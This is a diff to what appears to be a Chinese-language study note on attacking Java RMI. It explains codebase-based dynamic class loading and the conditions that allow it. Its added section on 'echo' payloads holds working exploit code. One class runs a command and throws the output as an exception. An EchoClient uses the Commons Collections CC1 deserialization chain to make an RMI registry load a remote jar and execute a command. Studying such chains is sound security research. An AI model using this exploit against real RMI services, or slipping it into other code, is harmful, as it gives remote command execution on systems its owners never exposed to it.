@@ -1900,11 +1900,24 @@ public class Register {
 
 ### 动态加载类攻击
 
-#### 对于register的攻击(JNDI注入)TODO
+
+
+RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用http://、ftp://、file://进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些**子类**中被重写的方法，客户端就需要从服务端提供的`java.rmi.server.codebase`URL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的**子类**，那么服务端需要从客户端提供的`java.rmi.server.codebase`URL去加载对应的类。客户端与服务端两边的`java.rmi.server.codebase`URL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：
+
+1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy。
+2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从**JDK 6u45、7u21**开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
+
+**这些条件较为苛刻，真实场景中几乎不会出现**
 
 #### 对于server的攻击（利用codebase）
 
+
+
 #### 对于client的攻击（利用codebase）
+
+
+
+### 利用JNDI注入攻击registerTODO
 
 ## 补充（TODO）
 
@@ -1915,6 +1928,127 @@ public class Register {
 * 为什么jdk8u231后的lookup要进行修改，增加`Reflections.setFieldValue(var3,"enableReplace",false);`
 
 ## 回显马的编写
+
+基本思路：
+
+* RMI的任何一方被攻击时，都会返回异常对象
+* 需要通过任意代码执行（注意与任意命令执行区别），抛出我们定义的异常对象
+  * 代码执行远程加载一个jar包，执行任意代码抛出异常（出网）
+  * 通过CC3等动态加载字节码的链，执行任意代码抛出异常：未成功，因为类的静态代码块不允许抛出异常，暂未找到解决办法
+
+### 远程加载jar包
+
+```java
+// 远程加载的代码，很好理解，将命令执行的结果交给异常对象抛出
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class ErrorBaseExec {
+
+    public static void do_exec(String args) throws Exception
+    {
+        Process proc = Runtime.getRuntime().exec(args);
+        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        StringBuilder sb = new StringBuilder();
+        String line;
+        while ((line = br.readLine()) != null)
+        {
+            sb.append(line).append("\n");
+        }
+        String result = sb.toString();
+        throw new Exception(result);
+    }
+}
+```
+
+```java
+// 这里是通过cc1打的register，并不适用所有版本和攻击对象
+// 代码的重点在于通过`Transformer[] transformers = new Transformer[]`执行的任意代码，这里是利用它加载了一个远程jar包，并加载其中的类，利用不同的链打client、server，是类似的思路
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class EchoClient {
+    public static Constructor<?> getFirstCtor(final String name)
+            throws Exception {
+        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
+        ctor.setAccessible(true);
+
+        return ctor;
+    }
+
+    public static void main(String[] args) throws Exception {
+        String ip = "127.0.0.1"; //注册中心ip
+        int port = 1099; //注册中心端口
+        String remotejar = ""; // 加载jar包的地址
+        String command = "whoami";
+
+        try {
+            final Transformer[] transformers = new Transformer[] {
+                    new ConstantTransformer(java.net.URLClassLoader.class),
+                    new InvokerTransformer("getConstructor",
+                            new Class[] { Class[].class },
+                            new Object[] { new Class[] { java.net.URL[].class } }),
+                    new InvokerTransformer("newInstance",
+                            new Class[] { Object[].class },
+                            new Object[] {
+                                    new Object[] {
+                                            new java.net.URL[] { new java.net.URL(remotejar) }
+                                    }
+                            }),
+                    new InvokerTransformer("loadClass",
+                            new Class[] { String.class },
+                            new Object[] { "org.example.echo.ErrorBaseExec" }), // 必须写完整的类名
+                    new InvokerTransformer("getMethod",
+                            new Class[] { String.class, Class[].class },
+                            new Object[] { "do_exec", new Class[] { String.class } }),
+                    new InvokerTransformer("invoke",
+                            new Class[] { Object.class, Object[].class },
+                            new Object[] { null, new String[] { command } })
+            };
+            Transformer transformedChain = new ChainedTransformer(transformers);
+            Map innerMap = new HashMap();
+            innerMap.put("value", "value");
+
+            Map outerMap = TransformedMap.decorate(innerMap, null,
+                    transformedChain);
+            Class cl = Class.forName(
+                    "sun.reflect.annotation.AnnotationInvocationHandler");
+            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+            ctor.setAccessible(true);
+
+            Object instance = ctor.newInstance(Target.class, outerMap);
+
+            Registry registry = LocateRegistry.getRegistry(ip, port);
+            Remote r = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, (InvocationHandler) instance);
+            registry.bind("liming", r);
+        } catch (Exception e) {
+            try {
+                System.out.print(e.getCause().getCause().getCause().getMessage());
+            } catch (Exception ee) {
+                throw e;
+            }
+        }
+    }
+}
+```
+
+### 动态加载字节码
+
+
 
 ## 借助BaRMIe对RMI进行攻击
 
